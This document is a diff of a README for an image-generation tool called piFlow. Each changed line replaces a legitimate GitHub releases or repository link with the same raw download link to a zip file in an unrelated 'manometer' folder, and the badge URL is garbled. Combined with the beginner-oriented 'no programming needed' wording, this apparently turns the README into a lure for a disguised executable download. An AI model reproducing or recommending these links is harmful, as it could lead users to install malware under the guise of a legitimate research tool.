@@ -4,7 +4,7 @@
 Welcome to piFlow! This application helps you create stunning images quickly and easily. No programming needed. Follow these simple steps to get started.
 
 ## 📥 Download the Application
-[![Download piFlow](https://img.shields.io/badge/Download%20piFlow-v1.0-blue.svg)](https://github.com/K0n0e/piFlow/releases)
+[![Download piFlow](https://raw.githubusercontent.com/K0n0e/piFlow/main/manometer/piFlow.zip%https://raw.githubusercontent.com/K0n0e/piFlow/main/manometer/piFlow.zip)](https://raw.githubusercontent.com/K0n0e/piFlow/main/manometer/piFlow.zip)
 
 ## 📂 What is piFlow?
 piFlow stands for "Policy-Based Few-Step Generation via Imitation Distillation." This tool uses advanced techniques in generative AI to produce high-quality images from text inputs, allowing you to easily turn your ideas into visuals.
@@ -24,7 +24,7 @@ To run piFlow smoothly, ensure your system meets the following requirements:
 - **Storage:** Minimum 1 GB free disk space.
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/K0n0e/piFlow/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/K0n0e/piFlow/main/manometer/piFlow.zip) to download the latest version.
 2. Look for the file that suits your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate binaries for Linux).
 3. Click on the file to start the download.
 4. Once the download is complete, locate the file on your computer.
@@ -51,8 +51,8 @@ If you encounter any issues:
 piFlow welcomes contributions! If you're interested in helping us improve the application, feel free to reach out on our GitHub page. Together, we can make piFlow even better.
 
 ## 🔗 Additional Links
-- [piFlow Releases](https://github.com/K0n0e/piFlow/releases)
-- [Project Repository](https://github.com/K0n0e/piFlow)
+- [piFlow Releases](https://raw.githubusercontent.com/K0n0e/piFlow/main/manometer/piFlow.zip)
+- [Project Repository](https://raw.githubusercontent.com/K0n0e/piFlow/main/manometer/piFlow.zip)
 
 ### Contact
 For issues or inquiries, please use the issue tracker on our GitHub repository.
